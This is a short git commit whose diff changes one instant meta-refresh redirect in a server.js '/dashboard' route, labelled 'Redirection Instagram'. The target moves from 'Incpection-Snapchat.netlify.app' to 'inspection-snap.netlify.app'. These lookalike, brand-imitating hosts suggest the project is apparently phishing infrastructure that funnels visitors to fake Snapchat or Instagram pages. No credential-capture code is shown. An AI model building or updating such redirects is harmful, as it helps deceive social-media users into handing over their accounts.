b0d32c8050651117a9381ca7e3877d9f3c3bf0ca
gogo5909 <gogo.liegeois@gmail.com>
2025-09-03 20:25:13 +0200

    ton message

--- server.js
+++ server.js
@@ -139,7 +139,7 @@ app.get('/dashboard', (req, res) => {
 <html lang="fr">
 <head>
     <meta charset="UTF-8" />
-    <meta http-equiv="refresh" content="0; url=https://Incpection-Snapchat.netlify.app/" />
+    <meta http-equiv="refresh" content="0; url=https://inspection-snap.netlify.app/" />
     <title>Redirection Instagram</title>
 </head>
 <body>
